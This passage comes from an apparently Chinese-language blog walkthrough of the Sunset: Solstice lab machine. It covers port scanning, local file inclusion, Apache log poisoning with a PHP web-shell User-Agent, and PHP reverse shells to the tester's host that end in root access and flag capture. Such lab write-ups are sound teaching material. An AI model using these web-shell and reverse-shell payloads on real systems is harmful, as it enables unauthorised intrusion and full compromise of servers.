-1s</span><br><span class="hljs-string">|_nbstat: NetBIOS name: SOLSTICE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="hljs-string">| smb2-security-mode: </span><br><span class="hljs-string">|   3:1:1: </span><br><span class="hljs-string">|_    Message signing enabled but not required</span><br><span class="hljs-string">| smb-security-mode: </span><br><span class="hljs-string">|   account_used: guest</span><br><span class="hljs-string">|   authentication_level: user</span><br><span class="hljs-string">|   challenge_response: supported</span><br><span class="hljs-string">|_  message_signing: disabled (dangerous, but default)</span><br></code></pre></td></tr></table></figure><p>2121 端口可匿名登录，3128 端口是代理转发端口，8593 上跑了个 PHP 的 Web 服务，同时还有 139 和 445 的 smb 服务。有一些产品和版本号也要记得搜一下是否有漏洞，比如这里的 <code>Exim smtpd 4.92</code> 和 <code>pyftpdlib 1.5.6</code>。 nmap 自带的漏洞脚本跑一下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_solstice]<br>└─$ sudo nmap --script=vuln -p21,22,25,80,139,445,2121,3128,8593,54787,62524 192.168.56.151 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 21:48 EDT<br><br>PORT      STATE  SERVICE<br>21/tcp    open   ftp<br>22/tcp    open   ssh<br>25/tcp    open   smtp<br>| smtp-vuln-cve2010-4344: <br>|   Exim version: 4.92<br>|   Exim heap overflow vulnerability (CVE-2010-4344):<br>|     Exim (CVE-2010-4344): NOT VULNERABLE<br>|   Exim privileges escalation vulnerability (CVE-2010-4345):<br>|     Exim (CVE-2010-4345): NOT VULNERABLE<br>|_  To confirm and exploit the vulnerabilities, run with --script-args=<span class="hljs-string">&#x27;smtp-vuln-cve2010-4344.exploit&#x27;</span><br>80/tcp    open   http<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">139/tcp   open   netbios-ssn</span><br><span class="hljs-string">445/tcp   open   microsoft-ds</span><br><span class="hljs-string">2121/tcp  open   ccproxy-ftp</span><br><span class="hljs-string">3128/tcp  open   squid-http</span><br><span class="hljs-string">8593/tcp  open   unknown</span><br><span class="hljs-string">54787/tcp open   unknown</span><br><span class="hljs-string">62524/tcp closed unknown</span><br><span class="hljs-string">MAC Address: 08:00:27:40:D0:9B (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb-vuln-regsvc-dos: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Service regsvc in Microsoft Windows systems vulnerable to denial of service</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference</span><br><span class="hljs-string">|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes</span><br><span class="hljs-string">|       while working on smb-enum-sessions.</span><br><span class="hljs-string">|_          </span><br><span class="hljs-string">|_smb-vuln-ms10-054: false</span><br><span class="hljs-string">|_smb-vuln-ms10-061: false</span><br></code></pre></td></tr></table></figure><p>没收获，试一试指定 smb 脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_solstice]<br>└─$ sudo nmap --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.56.151<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-10 23:12 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.151<br>Host is up (0.00013s latency).<br>Not shown: 992 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>22/tcp   open  ssh<br>25/tcp   open  smtp<br>80/tcp   open  http<br>139/tcp  open  netbios-ssn<br>445/tcp  open  microsoft-ds<br>2121/tcp open  ccproxy-ftp<br>3128/tcp open  squid-http<br>MAC Address: 08:00:27:40:D0:9B (Oracle VirtualBox virtual NIC)<br><br>Host script results:<br>| smb-enum-shares: <br>|   account_used: guest<br>|   \\192.168.56.151\IPC$: <br>|     Type: STYPE_IPC_HIDDEN<br>|     Comment: IPC Service (Samba 4.9.5-Debian)<br>|     Users: 2<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\tmp<br>|     Anonymous access: READ/WRITE<br>|     Current user access: READ/WRITE<br>|   \\192.168.56.151\<span class="hljs-built_in">print</span>$: <br>|     Type: STYPE_DISKTREE<br>|     Comment: Printer Drivers<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\var\lib\samba\printers<br>|     Anonymous access: &lt;none&gt;<br>|_    Current user access: &lt;none&gt;<br></code></pre></td></tr></table></figure><p>对 smb 的扫描没发现什么有价值的用户和路径</p><h2 id="FTP-匿名登录"><a href="#FTP-匿名登录" class="headerlink" title="FTP 匿名登录"></a>FTP 匿名登录</h2><p>看看 ftp 匿名登录吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_solstice]<br>└─$ ftp 192.168.56.151 2121<br>Connected to 192.168.56.151.<br>220 pyftpdlib 1.5.6 ready.<br>Name (192.168.56.151:kali): anonymous<br>331 Username ok, send password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; binary<br>200 Type <span class="hljs-built_in">set</span> to: Binary.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering extended passive mode (|||55617|).<br>125 Data connection already open. Transfer starting.<br>drws------   2 www-data www-data     4096 Jun 18  2020 pub<br>226 Transfer complete.<br>ftp&gt; <span class="hljs-built_in">cd</span> pub<br>250 <span class="hljs-string">&quot;/pub&quot;</span> is the current directory.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering extended passive mode (|||36105|).<br>125 Data connection already open. Transfer starting.<br>226 Transfer complete.<br>ftp&gt; <span class="hljs-built_in">pwd</span><br>Remote directory: /pub<br></code></pre></td></tr></table></figure><p>21 端口匿名登录需要密码，2121 端口匿名登录后只有一个文件夹，没有文件，尝试上传文件，提示没有权限。查看 Web 服务</p><h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>80 端口：</p><p><img src="/pic/582fa79813ae757d4e478f85784df633_MD5.png"></p><p>有产品的名字和版本号，尝试搜索漏洞库</p><p><img src="/pic/5657c12639e086bf640e68a946a7aded_MD5.png"></p><p>有 SQL 注入的 exp，但是尝试之后发现，存在 SQL 注入的 URL 是登录界面，而直接访问此 URL 得到的是 403 的回复。</p><p>尝试添加 3128 端口作为代理，访问 80 端口和存在注入的 URL，没什么额外的收获，还是无法访问目标 URL</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>尝试目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_solstice]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.151/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <br><br>===============================================================<br>[+] Url:                     http://192.168.56.151/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Timeout:                 10s<br>===============================================================<br>/app                  (Status: 301) [Size: 314] [--&gt; http://192.168.56.151/app/]<br>/javascript           (Status: 301) [Size: 321] [--&gt; http://192.168.56.151/javascript/]<br>/backup               (Status: 301) [Size: 317] [--&gt; http://192.168.56.151/backup/]<br>/server-status        (Status: 403) [Size: 279]<br></code></pre></td></tr></table></figure><p>访问这几个路径都是 403，又尝试了 dirsearch 的结果也没收获</p><p><img src="/pic/8a139ed3d665d98241b62ff38d78d180_MD5.png"></p><p>8593 端口也尝试了目录爆破，没结果</p><h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p>这里的 URL 看起来有点奇怪，尝试一下是否有可能是命令执行或者文件包含的漏洞</p><p><img src="/pic/def482fc6980be967fdcf80047f9fece_MD5.png"></p><p>存在文件包含漏洞，又顺手试了一下存不存在远程文件包含，结果是只存在本地文件包含</p><p>接下来我尝试了访问一些可能的敏感文件，主要参考 <code>AutoWordlists</code> ，尝试了 ssh 私钥，bash 历史文件，shadow 文件，和可能存在的 phpIPAM 配置文件 <code>/var/www/html/phpIPAM/config.php</code> （看网上的安装教程猜测的路径），几个 apache 日志路径，都没收获</p><p><img src="/pic/22c5c5dfc0ae447ae975059d147cf216_MD5.png"></p><p>passwd 文件中收集到的用户名，我也尝试了 ftp 爆破和 ssh 爆破，但由于时间太长，各跑了十分钟就停了</p><h2 id="通过日志文件反弹shell"><a href="#通过日志文件反弹shell" class="headerlink" title="通过日志文件反弹shell"></a>通过日志文件反弹shell</h2><p>不过均无收获，看了眼 WP，发现是 apache 日志可访问，再次跑到 <code>AutoWordlists</code> 中搜索 apache，依次访问</p><p><img src="/pic/6425cd77b7783695526d8d2ee774efe8_MD5.png"></p><p>在 <code>http://192.168.56.151:8593/index.php?book=../../../../var/log/apache2/access.log</code> 中访问得到了日志文件</p><p><img src="/pic/9dfb5316663cdc742a9e7152a9a484ce_MD5.png"></p><p>备注：这里由于我之前目录爆破得缘故，日志文件很大，因此我选择了恢复虚拟机的快照</p><p>使用 burp suite 来修改 User-Agent </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-apache"><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.56.151</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> &lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt; Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">102</span>.<span class="hljs-number">0</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Connection</span>: close</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Cookie</span>: PHPSESSID=dis82fr2akr5lpn6666uuug2ou</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">If</span>-Modified-Since: Thu, <span class="hljs-number">25</span> Jun <span class="hljs-number">2020</span> <span class="hljs-number">14</span>:<span class="hljs-number">45</span>:<span class="hljs-number">19</span> GMT</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">If</span>-None-Match: <span class="hljs-string">&quot;128-5a8e9a431c517-gzip&quot;</span></span><br><span class="language-apache"></span><br></code></pre></td></tr></table></figure><p>访问日志发现，php 代码并没有显示出来，那么证明了文件包含后代码被运行了。然后构造 payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.151</span>:<span class="hljs-number">8593</span><span class="hljs-regexp">/index.php?book=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>access.log&amp;cmd=id<br></code></pre></td></tr></table></figure><p>注意，这里可能下意识直接使用 <code>?cmd=id</code>，进而导致传入参数失败，一定要看清 URL 的结构，否则构造错误的 payload1 会极大浪费时间来排查</p><p><img src="/pic/e6326bd11514c7158814c0547f189a9d_MD5.png"></p><p>接下来考虑反弹 shell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">GET <span class="hljs-regexp">/index.php?book=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>access.log&amp;cmd=php+-r+<span class="hljs-string">&#x27;$sock%3dfsockopen(&quot;192.168.56.106&quot;,443)%3bexec(&quot;sh+&lt;%263+&gt;%263+2&gt;%263&quot;)%3b&#x27;</span> HTTP/<span class="hljs-number">1.1</span><br></code></pre></td></tr></table></figure><p>这里我先尝试了 <a href="https://www.revshells.com/">Online - Reverse Shell Generator (revshells.com)</a> 中的几个 PHP 代码，有几个反弹成功后立马就断开了，尝试了几个不同的代码最后得到了稳定的 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_solstice]<br>└─$ sudo nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.151] 52314<br><span class="hljs-built_in">whoami</span><br>www-data<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br><span class="hljs-built_in">which</span> python<br>/usr/bin/python<br>ip a   <br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:40:d0:9b brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.151/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 596sec preferred_lft 596sec<br>    inet6 fe80::a00:27ff:fe40:d09b/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br><span class="hljs-built_in">uname</span> -a<br>Linux solstice 4.19.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux</span><br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www-data@solstice:/home/miguel$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> www-data:<br><br></code></pre></td></tr></table></figure><h2 id="提权之信息收集"><a href="#提权之信息收集" class="headerlink" title="提权之信息收集"></a>提权之信息收集</h2><p>查看 SUID 文件、定时任务文件、网站目录下文件、用户家目录文件，没什么收获，而且 user.txt 是 www-data 用户无法直接读取的，直接 linpeas 吧</p><p>查看发现了几个感兴趣的点</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>. gcc 可用<br><span class="hljs-number">2</span>. 推荐了 [CVE-<span class="hljs-number">2019</span>-<span class="hljs-number">13272</span>] PTRACE_TRACEME 内核漏洞<br><span class="hljs-number">3</span>. <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">57</span> -t <span class="hljs-regexp">/var/</span>tmp<span class="hljs-regexp">/sv/</span> <span class="hljs-number">57</span>端口运行了一个服务<br><span class="hljs-number">4</span>. <span class="hljs-regexp">/var/</span>tmp 下有很多服务程序<br></code></pre></td></tr></table></figure><p>网站根目录下的一个配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@solstice:~/html/phpIPAM$ <span class="hljs-built_in">cat</span> config.php<br><span class="hljs-built_in">cat</span> config.php<br>Try harder!<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@solstice:/var/tmp$ <span class="hljs-built_in">ls</span> -liha<br><span class="hljs-built_in">ls</span> -liha<br>total 36K<br>524470 drwxrwxrwt  9 root     root     4.0K Oct 11 03:39 .<br>524289 drwxr-xr-x 12 root     root     4.0K Jun 13  2020 ..<br>527622 drwxr-xr-x  2 www-data www-data 4.0K Jun 25  2020 fake_ftp<br>524448 drws------  3 www-data www-data 4.0K Jun 17  2020 ftp<br>526416 drwsrwxrwx  2 root     root     4.0K Jun 26  2020 sv<br>527778 drwx------  3 root     root     4.0K Oct 11 02:56 systemd-private-eb3c320d1bd44bd19d2a522d01716beb-apache2.service-B3KLFo<br>524319 drwx------  3 root     root     4.0K Oct 11 02:56 systemd-private-eb3c320d1bd44bd19d2a522d01716beb-systemd-timesyncd.service-H8nVn6<br>524444 drwxr-xr-x  2 www-data www-data 4.0K Jun 26  2020 webserver<br>524447 drwxr-xr-x  3 www-data www-data 4.0K Jun 19  2020 webserver_2<br></code></pre></td></tr></table></figure><p>先看一下 57 端口运行的服务吧，这个没直接暴露在 web 中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@solstice:/var/tmp/sv$ <span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span> -alih<br>total 12K<br>526416 drwsrwxrwx 2 root root 4.0K Jun 26  2020 .<br>524470 drwxrwxrwt 9 root root 4.0K Oct 11 03:39 ..<br>527621 -rwxrwxrwx 1 root root   36 Jun 19  2020 index.php<br>www-data@solstice:/var/tmp/sv$ <span class="hljs-built_in">cat</span> index.php<br><span class="hljs-built_in">cat</span> index.php<br>&lt;?php<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Under construction&quot;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><h2 id="网站文件权限配置错误提权"><a href="#网站文件权限配置错误提权" class="headerlink" title="网站文件权限配置错误提权"></a>网站文件权限配置错误提权</h2><p>index.php 竟然是 root 属主 777 权限的文件，加上又绑定了运行的端口，或许可以利用，写入反弹 shell 的代码到文件中，不过又遇到了之前反弹 shell 的问题，刚连上就断开了，反复换了几个一句话的代码，最终成功。提前开启监听后再使用 curl 命令来反弹shell</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs console">www-data@solstice:/var/tmp/sv$ echo &#x27;&lt;?php $sock=fsockopen(&quot;192.168.56.106&quot;,444);$proc=proc_open(&quot;sh&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes); ?&gt;&#x27; &gt; index.php<br><br>www-data@solstice:/var/tmp/sv$ cat index.php<br>&lt;?php $sock=fsockopen(&quot;192.168.56.106&quot;,444);$proc=proc_open(&quot;sh&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes); ?&gt;<br>www-data@solstice:/var/tmp/sv$ curl http://127.0.0.1:57/index.php<br></code></pre></td></tr></table></figure><p>反弹 shell 成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_solstice]<br>└─$ sudo nc -lvnp 444<br>listening on [any] 444 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.151] 47580<br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:40:d0:9b brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.151/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 413sec preferred_lft 413sec<br>    inet6 fe80::a00:27ff:fe40:d09b/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br><span class="hljs-built_in">uname</span> -a<br>Linux solstice 4.19.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure><p>找找 flag 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root<br><span class="hljs-built_in">ls</span> -liah<br>total 60K<br>131078 drwx------  9 root root 4.0K Jun 26  2020 .<br>     2 drwxr-xr-x 18 root root 4.0K Apr 21  2020 ..<br>142795 lrwxrwxrwx  1 root root    9 Jun 26  2020 .bash_history -&gt; /dev/null<br>131081 -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc<br>267055 drwx------  3 root root 4.0K Jun 17  2020 .cache<br>262148 drwxr-xr-x  3 root root 4.0K Jun 13  2020 .config<br>269685 drwxr-xr-x  2 root root 4.0K Jun 19  2020 ftp<br>262531 drwx------  3 root root 4.0K Jun 18  2020 .gnupg<br>142644 drwxr-xr-x  3 root root 4.0K Jun 13  2020 .<span class="hljs-built_in">local</span><br>142642 -rw-------  1 root root 2.8K Jun 19  2020 .mysql_history<br>131080 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>142794 -rw-r--r--  1 root root  113 Jun 26  2020 root.txt<br>142775 -rw-r--r--  1 root root   66 Jun 13  2020 .selected_editor<br>269682 drwx------  2 root root 4.0K Jun 19  2020 .ssh<br>142776 -rw-r--r--  1 root root  173 Jun 25  2020 .wget-hsts<br>267135 drwxr-xr-x  4 root root 4.0K Jun 18  2020 .wine<br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>root@solstice:~<span class="hljs-comment"># cat root.txt</span><br><span class="hljs-built_in">cat</span> root.txt<br><br>No ascii art <span class="hljs-keyword">for</span> you &gt;:(<br><br>Thanks <span class="hljs-keyword">for</span> playing! - Felipe Winsnes (@whitecr0wz)<br><br>f950998f0d484a2ef1ea83ed4f42bbca<br><br>root@solstice:~<span class="hljs-comment"># cat /home/miguel/user.txt</span><br><span class="hljs-built_in">cat</span> /home/miguel/user.txt<br>c0e1f61ff8e753d8b27615bdc4f25794<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>卡住的点是本地文件包含来反弹 shell，寻找 apache 日志文件目录时没有更多尝试，导致攻击路径没有成功。这台靶机别的方面倒是没特别复杂</p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>蛮好用的一个别人的备忘录：<a 